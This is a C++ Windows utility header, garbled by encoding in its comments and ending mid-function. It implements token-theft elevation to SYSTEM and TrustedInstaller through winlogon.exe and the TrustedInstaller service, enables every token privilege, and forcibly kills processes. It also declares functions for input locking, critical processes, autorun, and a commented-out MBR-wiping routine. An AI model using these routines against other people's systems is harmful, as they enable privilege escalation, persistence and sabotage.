/**********************************************************
@brief: 			 xbebhxx3�����ϼ�
@license: 	         GPLv3
@version:  	         10.0
@remarks:            ����ʱ�� -lgdi32 -lwsock32
@author:             xbehxx3
@date:               2022/3/28
@file:               x3-f.h
@copyright           Copyright (c) 2022 xbebhxx3, All Rights Reserved
***************************************/
//             ����       ����
//            �����ߩ����������������ߩ�
//            ��     ?     ��
//            ��  �ש�    ���� ��
//            ��     ��     ��
//            ������       ������
//              ��       ����������������������������
//              ��           ���ޱ���  �ǩ�
//              ��       xbebhxx3       ��
//              ��   ����BUG��         ����
//              �����������ש������������������������ש�����
//               ���ϩ� ���ϩ�      ���ϩ� ���ϩ�
//               ���ߩ� ���ߩ�      ���ߩ� ���ߩ�

//ģ��
/*********************************************
 *  @Sample usage   ʹ��ʵ��
 *  @brief           ����
 *  @param           ��������
 *  @return          ��������ֵ����
 *  @exception       �������쳣����
 *  @warning         ����ʹ������Ҫע��ĵط�
 *  @calls           �����õĺ���
 *  @remarks         ��ע
 *  @note            ��ϸ����
 *  @author          xbebhxx3
 *  @version         �汾��
 *  @date            ����
 *  @copyright       Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **********************************************/
#ifndef X3_F_H
#define X3_F_H
#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <string>
#include <random>
#include <time.h>

using namespace std;

//Ȩ�޲���
BOOL Debug();								//���debugȨ��
BOOL EnableAllPrivilege();					//���debugȨ��
BOOL IsProcessRunAsAdmin();					//�ж��Ƿ��Թ���ԱȨ������
BOOL RunAsAdmin();							//�Թ���ԱȨ��������ǰ����
BOOL RunAsSystem();							//��SystemȨ��������ǰ����
BOOL RunAsTi();								//��TrustedInstallerȨ��������ǰ����
BOOL UseSystem(const char *exec);			// ��systemȨ�޴򿪿�ִ���ļ�
BOOL UseTrustedInstaller(const char *exec); //��TrustedInstallerȨ�޴򿪿�ִ���ļ�
//���̲���
BOOL KillProcess(DWORD dwProcessID);					//��������
DWORD isProcess(const char *szImageName);				//�жϽ����Ƿ���� ,�����ؽ���id
char *GetProcesslocation(DWORD dwProcessID);			//��ý���·��
BOOL SuspendProcess(DWORD dwProcessID, BOOL fSuspend);	//�������
BOOL CriticalProcess(DWORD dwProcessID, BOOL fSuspend); //����/����ؼ�����
BOOL CloseService(const char *service);					//ֹͣ����
BOOL _StartService(const char *service);				//��������
void ListService();										//�г����з���
//���ڲ���
class SerialPort //���ڲ���
{
public:
	BOOL open(const char *portname, int baudrate, char parity, char databit, char stopbit, char synchronizeflag); // �򿪴���
	void close();																								  //�رմ���
	int send(string dat);																						  //�������ݻ�д����
	string receive();																							  //�������ݻ������
private:
	int pHandle[16];
	char synchronizeflag;
};
//ע������
char *ReadReg(const char *path, const char *key);					 //��ע���
BOOL WriteReg(const char *path, const char *key, const char *value); //дע���
BOOL DelReg(const char *path);										 //дע���
BOOL DelRegValue(const char *path, const char *Value);				 //ɾ��ע�����
BOOL AutoRun(const char *name, BOOL fSuspend);						 //���ÿ�������
string CodeUrl(const string &URL);									 // Url����
string DecodeUrl(const string &URL);								 // Url����
char *x3code(char *c);												 // x3code����
//�ı���ɫ
void rgb_init();											  // RGB��ʼ��
void rgb_set(int wr, int wg, int wb, int br, int bg, int bb); // RGB����
//����
BOOL lockkm(BOOL lockb);					   //���������� (��Ҫ����ԱȨ��)
void mouxy(int &x, int &y);					   // ������λ��
void cls();									   //����
void delspace(string &s);					   // strɾ���ո�
char *getIp();								   //��õ�ǰip
char *GetUser();							   //��õ�ǰ�û���
const char *GetSystemVersion();				   //���ϵͳ�汾
char *getCmdResult(const char *Cmd);		   //ִ��cmd�����÷���ֵ
void OutoutMiddle(const char str[], int y);	   //�������
void full_screen(HWND hwnd);				   //ȫ�����
long long radom(long long min, long long max); //���������
// void killmbr();//�ƻ�mbr(very danger)Ĭ��ע��,ʹ��ʱɾ��ע��
//Ȩ�޲�����ʼ

/**************************************************
 *  @brief         ���debugȨ��
 *  @Sample usage  Debug();
 *  @return        1�ɹ���0ʧ��
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2021/1/13
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL Debug()
{
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) //�򿪵�ǰ����
	{
		CloseHandle(hToken); //�ر�handle
		return 0;
	}

	//���Ȩ��
	LUID luid;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) //���Ȩ��
	{
		CloseHandle(hToken); //�ر�handle
		return 0;
	}
	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tkp.Privileges[0].Luid = luid;
	if (!AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL)) //�ж��Ƿ�ɹ�
	{
		CloseHandle(hToken); //�ر�handle
		return 0;
	}
	CloseHandle(hToken); //�ر�handle
	return 1;
}

/**************************************************
 *  @brief         ������н���Ȩ��
 *  @Sample usage  EnableAllPrivilege();
 *  @return        1�ɹ���0ʧ��
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2022/11/15
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL EnableAllPrivilege()
{
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) //�򿪵�ǰ����
	{
		CloseHandle(hToken); //�ر�handle
		return 0;
	}
	//���Ȩ��

	LUID luid;
	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL value;
	value = LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeCreateTokenPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeAssignPrimaryTokenPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeLockMemoryPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeIncreaseQuotaPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeUnsolicitedInputPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeMachineAccountPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeTcbPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeSecurityPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeTakeOwnershipPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeLoadDriverPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeSystemProfilePrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeSystemProfilePrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeSystemtimePrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeProfileSingleProcessPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeIncreaseBasePriorityPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeCreatePagefilePrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeCreatePermanentPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeBackupPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeRestorePrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeShutdownPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeAuditPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeSystemEnvironmentPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeChangeNotifyPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeRemoteShutdownPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeUndockPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeSyncAgentPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeEnableDelegationPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeManageVolumePrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeImpersonatePrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeCreateGlobalPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeTrustedCredManAccessPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeRelabelPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeIncreaseWorkingSetPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeTimeZonePrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeCreateSymbolicLinkPrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	value = LookupPrivilegeValue(NULL, "SeDelegateSessionUserImpersonatePrivilege", &luid); //����Ȩ��
	tkp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //����Ȩ��

	CloseHandle(hToken); //�ر�handle
	return value;
}

/**************************************************
 *  @brief         �ж��Ƿ��Թ���ԱȨ������
 *  @return        1����Ա,0����
 *  @note          ͷ�ļ�: #include <Windows.h>
 *  @Sample usage  IsProcessRunAsAdmin();
 *  @author        xbebhxx3
 *  @version       2.0
 *  @date          2022/3/28
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL IsProcessRunAsAdmin()
{
	BOOL bElevated = FALSE;
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) //�򿪽���
	{
		CloseHandle(hToken); //�ر�handle
		return 0;
	}
	//��ý���token
	TOKEN_ELEVATION tokenEle;
	DWORD dwRetLen = 0;
	if (GetTokenInformation(hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen)) //��ý���token
		if (dwRetLen == sizeof(tokenEle))													 //�ж�
			bElevated = tokenEle.TokenIsElevated;

	CloseHandle(hToken);
	return bElevated; //����
}

/**************************************************
 *  @brief         �Թ���ԱȨ��������ǰ����
 *  @return        0�Ѿ��ǹ���Ա
 *  @note          ͷ�ļ�: #include <Windows.h>
 *  @Sample usage  RunAsAdmin();
 *  @Calls         IsProcessRunAsAdmin
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2022/3/28
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL RunAsAdmin()
{
	if (IsProcessRunAsAdmin() == 1) //�ж��Ƿ��ǹ���Ա����ֹѭ������
		return 0;

	char szFilePath[MAX_PATH + 1] = {0};
	GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //��õ�ǰ�ļ�·��

	ShellExecute(NULL, "runas", szFilePath, NULL, NULL, SW_SHOW); //�ù���ԱȨ�޴�
	exit(0);													  //�˳���ǰ���̣���ֹ����2������
}

/**************************************************
 *  @brief         ��SystemȨ��������ǰ����
 *  @return        1�Ѿ���System
 *  @note          ͷ�ļ�: #include <Windows.h>
 *  @Sample usage  RunAsTi();
 *  @Calls         IsProcessRunAsAdmin,UseSystem,GetUser
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2022/9/7
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL RunAsSystem()
{

	if (IsProcessRunAsAdmin() == 0 || lstrcmp(GetUser(), "SYSTEM") == 0) //�ж��Ƿ��й���ԱȨ�ޣ��ж��Ƿ���SYSTEMȨ��,��ֹѭ������
		return 0;

	char szFilePath[MAX_PATH + 1] = {0};
	GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //��õ�ǰ�ļ�·��
	UseSystem(szFilePath);							//��TrustedInstallerȨ�޴�
	exit(0);										//�˳���ֹ2������
}

/**************************************************
 *  @brief         ��TrustedInstallerȨ��������ǰ����
 *  @return        1�Ѿ���TrustedInstaller
 *  @note          ͷ�ļ�: #include <Windows.h>
 *  @Sample usage  RunAsTi();
 *  @Calls         IsProcessRunAsAdmin,UseTrustedInstaller,GetUser
 *  @remarks       ��������IsProcessRunAsAdmin�ж��Ƿ�Ϊ����ԱȨ�� ��������UseTrustedInstaller��Ȩ ��������GetUser�жϵ�ǰ�û���
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2022/9/7
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL RunAsTi()
{

	if (IsProcessRunAsAdmin() == 0 || lstrcmp(GetUser(), "SYSTEM") == 0) //�ж��Ƿ��й���ԱȨ�ޣ��ж��Ƿ���SYSTEMȨ��,��ֹѭ������
		return 0;

	char szFilePath[MAX_PATH + 1] = {0};
	GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //��õ�ǰ�ļ�·��
	UseTrustedInstaller(szFilePath);				//��TrustedInstallerȨ�޴�
	exit(0);										//�˳���ֹ2������
}

/**************************************************
 *  @brief         ��systemȨ�޴򿪿�ִ���ļ�
 *  @param         exec:��ִ�г���·��
 *  @return        1�ɹ�,0ʧ��
 *  @note          ͷ�ļ�: #include <Windows.h>
 *  @calls          Debug
 *  @Sample usage  UseSystem("c:\\windows\\system32\\cmd.exe");
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2022/3/28
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL UseSystem(const char *exec)
{
	int num = MultiByteToWideChar(0, 0, exec, -1, NULL, 0);
	wchar_t *wexec = new wchar_t[num];
	MultiByteToWideChar(0, 0, exec, -1, wexec, num); // char *תwchar_t

	DWORD PID_TO_IMPERSONATE = isProcess("winlogon.exe"); //���winlogon.exe��pid
	//����֮����Ҫ�ı���
	HANDLE tokenHandle = NULL;			//��������
	HANDLE duplicateTokenHandle = NULL; //���Ƶ�����

	STARTUPINFO startupInfo; //��������������Ľṹ
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, NULL); //��ȡ������е���Ȩ��

	Debug(); //���debugȨ��

	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE); // ��ȡָ�����̵ľ��

	if (!processHandle)
		OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE); //�ƹ���΢��Ľ��̱���

	OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle); // ��ȡָ�����̵ľ������

	if (ImpersonateLoggedOnUser(tokenHandle)) //ģ���¼�û��İ�ȫ������
		RevertToSelf();
	DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle); // ���ƾ���SYSTEMȨ�޵�����

	BOOL value = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, wexec, NULL, 0, NULL, NULL, (LPSTARTUPINFOW)&startupInfo, &processInformation); // ����ָ�����������Ľ���
	CloseHandle(tokenHandle);
	CloseHandle(duplicateTokenHandle);
	CloseHandle(processHandle); //�ر�handle
	return value;
}

/**************************************************
 *  @brief         ��TrustedInstallerȨ�޴򿪿�ִ���ļ�
 *  @param         exec:��ִ�г���·��
 *  @return        1�ɹ�,0ʧ��
 *  @note          ͷ�ļ�: #include <Windows.h>
 *  @Sample usage  UseTrustedInstaller("cmd");
 *  @calls          Debug
 *  @author        xbebhxx3
 *  @version       5.0
 *  @date          2022/8/10
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL UseTrustedInstaller(const char *exec)
{
	int num = MultiByteToWideChar(0, 0, exec, -1, NULL, 0);
	wchar_t *wexec = new wchar_t[num];
	MultiByteToWideChar(0, 0, exec, -1, wexec, num); // char *תwchar_t

	Debug(); //���debugȨ��

	HANDLE hSystemToken, IhDupToken;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //�������̿���
	PROCESSENTRY32W pe = {0};
	pe.dwSize = sizeof(PROCESSENTRY32W);
	Process32FirstW(hSnapshot, &pe);
	while (Process32NextW(hSnapshot, &pe) && _wcsicmp(pe.szExeFile, L"winlogon.exe"))
		;																																	//��ǰ������winlogon.exe
	OpenProcessToken(OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID), MAXIMUM_ALLOWED, &hSystemToken); // ��ȡָ�����̵ľ������
	SECURITY_ATTRIBUTES ItokenAttributes;
	ItokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	ItokenAttributes.lpSecurityDescriptor = '\0';
	ItokenAttributes.bInheritHandle = FALSE;
	DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, &ItokenAttributes, SecurityImpersonation, TokenImpersonation, &IhDupToken); //������
	ImpersonateLoggedOnUser(IhDupToken);																						//��������������Ľṹ
	//����֮����Ҫ�ı���
	HANDLE hTIProcess, hTIToken, hDupToken, hToken;
	LPVOID lpEnvironment;
	LPWSTR lpBuffer;
	SC_HANDLE hSCManager, hService;
	DWORD dwProcessId = 0;
	BOOL res = TRUE, started = TRUE;
	//����TrustedInstaller���񲢻��id
	hSCManager = OpenSCManager('\0', SERVICES_ACTIVE_DATABASE, GENERIC_EXECUTE);
	hService = OpenServiceW(hSCManager, L"TrustedInstaller", GENERIC_READ | GENERIC_EXECUTE); //��TrustedInstaller����
	SERVICE_STATUS_PROCESS statusBuffer = {0};
	DWORD bytesNeeded;
	while (dwProcessId == 0 && started && (res = QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&statusBuffer), sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)))
	{
		switch (statusBuffer.dwCurrentState)
		{
		case SERVICE_STOPPED:
			started = StartServiceW(hService, 0, '\0'); //����TrustedInstaller����
		case SERVICE_STOP_PENDING:
			Sleep(statusBuffer.dwWaitHint); //�ȴ���������
		case SERVICE_RUNNING:
			dwProcessId = statusBuffer.dwProcessId; //��ֵ����id
		}
	}

	hTIProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwProcessId); //��TrustedInstaller����
	OpenProcessToken(hTIProcess, MAXIMUM_ALLOWED, &hTIToken);									  //���TrustedInstaller����Token

	SECURITY_ATTRIBUTES tokenAttributes;
	tokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	tokenAttributes.lpSecurityDescriptor = '\0';
	tokenAttributes.bInheritHandle = FALSE;
	DuplicateTokenEx(hTIToken, MAXIMUM_ALLOWED, &tokenAttributes, SecurityImpersonation, TokenImpersonation, &hDupToken); //���ƴ���TrustedInstallerȨ�޵�����
	OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &hToken);															  // ��ȡָ�����̵ľ��

	DWORD nBufferLength = GetCurrentDirectoryW(0, '\0');
	lpBuffer = (LPWSTR)(new wchar_t[nBufferLength]);
	GetCurrentDirectoryW(nBufferLength, lpBuffer); //�������ϵͳ·��

	STARTUPINFOW startupInfo;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFOW));
	startupInfo.lpDesktop = (LPWSTR)L"Winsta0\\Default";
	PROCESS_INFORMATION processInfo;
	ZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));

	BOOL value = CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, '\0', wexec, CREATE_UNICODE_ENVIRONMENT, lpEnvironment, lpBuffer, &startupInfo, &processInfo); //��
	CloseHandle(hSystemToken);
	CloseHandle(hTIProcess);
	CloseHandle(hToken);
	CloseHandle(IhDupToken);
	CloseHandle(hSnapshot);
	CloseServiceHandle(hSCManager);
	CloseServiceHandle(hService); //�ر�handle
	return value;
}

//���̲�����ʼ

/**************************************************
 *  @brief          ��������
 *  @param          szImageName:����id
 *  @note           ͷ�ļ�: #include <Windows.h> #include <TlHelp32.h>
 *  @Sample usage 	KillProcess(1000);
 *  @author         xbebhxx3
 *  @version        2.0
 *  @date           2022/3/15
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL KillProcess(DWORD dwProcessID)
{
	HANDLE Token = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessID); //�򿪽���
	
	if (!TerminateProcess(Token, 0) || Token == NULL)				   //ɱ������,���δ�ɹ�ʹ����һ������
	{
		CloseHandle(Token);															 //�ر�HANDLE
		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessID); //����Ҫ�������̵��߳̿���
		if (hSnapshot != INVALID_HANDLE_VALUE)
		{
			BOOL rtn = false;
			THREADENTRY32 te = {sizeof(te)};
			BOOL fOk = Thread32First(hSnapshot, &te);
			for (; fOk; fOk = Thread32Next(hSnapshot, &te)) //�����߳�
			{
				if (te.th32OwnerProcessID == dwProcessID)
				{
					HANDLE hThread = OpenThread(THREAD_TERMINATE, FALSE, te.th32ThreadID); //���߳�
					if (TerminateThread(hThread, 0))									   //�����߳�
						rtn = true;
					CloseHandle(hThread); //�ر�HANDLE
				}
			}
			CloseHandle(hSnapshot); //�ر�HANDLE
			return rtn;
		}
		return false;
	}
	CloseHandle(Token); //�ر�HANDLE
	return true;
}

/**************************************************
 *  @brief          �жϽ����Ƿ���� ,�����ؽ���id
 *  @param          szImageName:������
 *  @note           ͷ�ļ�: #include <Windows.h> #include <TlHelp32.h> #include <string>
 *  @Sample usage 	isProcess("cmd.exe");
 * 	@return         0������ ��0Ϊ����id
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/3/15
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
DWORD isProcess(const char *szImageName)
{
	PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)};					   //��ý����б�
	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //�������
	BOOL bRet = Process32First(hProcess, &pe);						   //���������е�һ��������Ϣ

	while (bRet)
	{ //�������һ�����̣���������
		if (lstrcmp(szImageName, pe.szExeFile) == 0)
		{
			CloseHandle(hProcess);
			return pe.th32ProcessID; //���ؽ���id
		}

		bRet = Process32Next(hProcess, &pe); //��һ������
	}
	CloseHandle(hProcess);
	return 0;
}

/**************************************************
 *  @brief          ��ý���·��
 *  @param          szImageName:������
 *  @note           ͷ�ļ�: #include <Windows.h> #include <TlHelp32.h> #include <string>
 *  @Sample usage   GetProcesslocation("cmd.exe");
 * 	@return  	    0������ ��0Ϊ����λ��
 *  @calls          isProcess
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/5/18
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
char *GetProcesslocation(DWORD dwProcessID)
{
	HANDLE hModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessID); // �������̿���
	MODULEENTRY32 *minfo = new MODULEENTRY32;
	Module32First(hModule, minfo); // �ѵ�һ��ģ����Ϣ�� minfo
	CloseHandle(hModule);
	return minfo->szExePath;
}

/**************************************************
 *  @brief          �������
 *  @param          dwProcessID:����ID fSuspend:TRUE����,FALSE���
 *  @note           ͷ�ļ�: #include <Windows.h> #include <TlHelp32.h>
 *  @Sample usage   SuspendProcess(isProcess("cmd.exe"),1);
 *  @calls          Debug
 * 	@return     	1�ɹ���0 ʧ��
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/5/18
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL SuspendProcess(DWORD dwProcessID, BOOL fSuspend)
{
	BOOL ret = 1;

	Debug(); //���debugȨ��

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessID); //��ý��̿���
